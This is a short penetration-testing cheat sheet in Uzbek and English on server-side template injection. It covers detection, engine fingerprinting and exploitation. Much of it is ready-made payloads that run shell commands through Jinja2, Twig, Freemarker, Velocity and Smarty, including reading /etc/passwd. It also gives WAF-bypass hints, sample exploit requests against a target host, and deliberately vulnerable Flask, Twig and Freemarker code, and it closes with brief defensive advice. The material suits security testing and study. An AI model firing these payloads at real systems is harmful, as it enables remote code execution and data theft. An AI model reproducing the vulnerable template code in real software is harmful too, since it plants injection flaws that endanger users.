# Server-Side Template Injection (SSTI)

## 1. Ta'rif
SSTI — server template'ga user input qo'shilib, template engine tomonidan ishlanadi. Attacker template expression yuborsa — RCE gacha borish mumkin. Impact: RCE, file read, info leak, XSS.

## 2. Qayerdan kelib chiqadi
- Bugun ko'plab saytlarda mail template, invite, PDF, error page foydalanuvchi input bilan template to'ldiriladi
- Engine: Jinja2 (Python), Twig (PHP), Freemarker (Java), Velocity, Thymeleaf, ERB (Ruby), Pug/Handlebars (Node)
- Input direkt template string'ga: `render_template_string("Hello " + name)`

## 3. Turlari
| Engine | Sintaksis |
|--------|-----------|
| Jinja2 / Twig | `{{ 7*7 }}`, `{% ... %}` |
| Freemarker | `<#assign x=...>` |
| Velocity | `#set($x = ...)` |
| Ruby ERB | `<%= 7*7 %>` |
| Smarty | `{7*7}`, `{php}` |

## 4. Metodologiya
1. Input toping — qaerda render qilinadi (error mesage, email subject, PDF gen).
2. Detection:
   ```
   7*7
   ${{7*7}}
   {{7*7}}
   {{7*'7'}}
   <%= 7*7 %>
   ```
   → `49` yoki `7777777` chiqsa SSTI.
3. Engine fingerprint:
   - `{{7*'7'}}` → `49` = Twig, `7777777` = Jinja2
   - `{{7/0}}` error message'da Python (`ZeroDivisionError`) vs PHP
4. POC → exploitation (RCE path):
   - Jinja2 RCE:
     ```
     {{ config }}
     {{ cycler.__init__.__globals__.os.popen('id').read() }}
     {{ ''.__class__.__mro__[2].__subclasses__() }}
     {{ lipsum.__globals__['os'].popen('id').read() }}
     ```
   - Twig RCE:
     ```
     {{['id']|filter('system')}}
     {{_self.env.registerUndefinedFilterCallback('system')('id')}}
     ```
   - Freemarker:
     ```
     <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
     ```
   - Velocity:
     ```
     #set($e="e");$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
     ```
   - Smarty: `{system('id')}` / `{php}system('id'){/php}`
5. WAF bypass: `\x2e`, `{%` `{{` bo'shliqsiz, encoding.

## 5. Payload'lar
```
# Detection
{{7*7}}
{{7*'7'}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}} {{self}}
{{cycler.__init__.__globals__}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Jinja2 RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<i>].__init__.__globals__['os'].popen('id').read() }}

# Twig
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback('system')('id')}}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Smarty
{system('id')}
{php}system('id'){/php}
```

## 6. Request misollari
```
POST /api/email HTTP/1.1
Host: target.com
Content-Type: application/json

{"subject": "{{7*7}}", "body": "test"}

GET /greet?name={{''.__class__.__mro__[1].__subclasses__()[216].__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
```

## 7. Zaif code misollari
```python
# ZAIF (Flask)
from flask import Flask, request
from jinja2 import Template
app = Flask(__name__)
@app.route("/")
def index():
    name = request.args.get("name")
    return Template("Hello {{ " + name + " }}").render()
```
```php
// ZAIF (Twig)
$twig->createTemplate("Hello " . $_GET['name']);
```
```java
// ZAIF (Freemarker)
Template t = new Template("t", "Hello " + input, cfg);
```

## 8. Nimalarga ahamiyat berish (checklist)
- [ ] `{{ }}` vs `{ }` filterdan o'tish — bo'shliq, `\t`, double braces
- [ ] Detection'da `7*7` va `7*'7'` (mesh turli)
- [ ] RCE ishonmasa — hali ham SSTI reconna / config leak report qilinadi
- [ ] `{% debug %}` (Twig), `{{_self.env...}}`
- [ ] `config`, `self`, `request` global'lar — info leak
- [ ] Payloadni email/PDF render qilinadigan page'da ham sinash
- [ ] Freemarker `?new()` blok bo'lsa `?eval`, `execute` boshqalar
- [ ] RCE detal: `__class__.__mro__[1].__subclasses__()` index bo'yicha qidirish

## 9. Himoya
- NEVER user input template'ga; input data bo'lsin, struktura template'da
- Template engine sandbox (agar bo'lsa)
- Encapsulate: render(template, {"name": user_input}) — input value sifatida